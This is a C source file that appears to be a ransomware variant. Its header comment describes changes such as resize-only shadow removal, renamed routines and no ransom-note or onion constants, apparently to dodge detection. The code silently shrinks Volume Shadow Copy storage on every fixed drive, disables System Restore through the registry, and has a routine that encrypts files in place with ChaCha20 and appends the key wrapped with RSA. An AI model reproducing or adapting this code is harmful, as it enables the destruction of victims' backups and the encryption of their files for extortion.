/* Variant: resize-only shadow removal, libsodium ChaCha spelling,
 * renamed routines, no ransom-note filename or onion constants. */
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <openssl/rsa.h>
#include <sodium.h>

static void shrink_shadows(void)
{
    DWORD mask = GetLogicalDrives();
    char root[4] = "C:\\";
    char line[256];
    int i;
    HKEY hk;
    DWORD v = 1;
    for (i = 0; i < 26; i++) {
        if (!(mask & (1u << i))) continue;
        root[0] = (char)('A' + i);
        if (GetDriveTypeA(root) != DRIVE_FIXED) continue;
        snprintf(line, sizeof line,
                 "vssadmin resize shadowstorage /for=%c: /on=%c: /maxsize=320MB >nul 2>&1",
                 'A' + i, 'A' + i);
        WinExec(line, SW_HIDE);
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore",
                      0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegSetValueExA(hk, "DisableSR", 0, REG_DWORD, (const BYTE *)&v, sizeof v);
        RegCloseKey(hk);
    }
}

static void seal(const char *path, RSA *pk)
{
    unsigned char k[32], n[12], wrap[512], buf[8192];
    FILE *f = fopen(path, "r+b");
    size_t got;
    int wl;
    if (!f) return;
    randombytes_buf(k, sizeof k);
    randombytes_buf(n, sizeof n);
    while ((got = fread(buf, 1, sizeof buf, f)) > 0) {
        long pos = ftell(f) - (long)got;
        crypto_stream_chacha20_ietf_xor(buf, buf, got, n, k);
        fseek(f, pos, SEEK_SET);
        fwrite(buf, 1, got, f);
        fseek(f, pos + (long)got, SEEK_SET);
    }
    wl = RSA_public_encrypt(32, k, wrap, pk, RSA_PKCS1_OAEP_PADDING);
    if (wl > 0) fwrite(wrap, 1, (size_t)wl, f);
    fclose(f);
}

int main(void)
{
    shrink_shadows();
    return 0;
}
